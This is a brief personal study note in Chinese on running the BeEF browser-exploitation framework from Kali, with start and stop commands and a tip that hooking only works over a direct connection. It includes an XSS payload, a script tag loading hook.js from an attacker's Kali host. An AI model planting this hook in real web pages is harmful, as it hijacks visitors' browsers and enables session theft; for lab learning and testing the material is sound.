+++
title = 'beef xss'
date = 2024-09-17T23:47:23+08:00
draft = false
categories = ['CS', 'sec']
+++


## 命令

```sh
# start
beef-xss

beef-xss-stop
```

---
## xss注入

```html
<script src="http://<kali-ip>:3000/hook.js"></script>
```

---
# 问题记录
---
## beef 抓不到本地访问记录

==要直连，不能用代理！！！==

![](../../../../img/Pasted%20image%2020240917234606.png)

> 为什么不能用代理？
> 
> gpt：代理服务器本身不在我的内网中，无法解析和访问内部地址
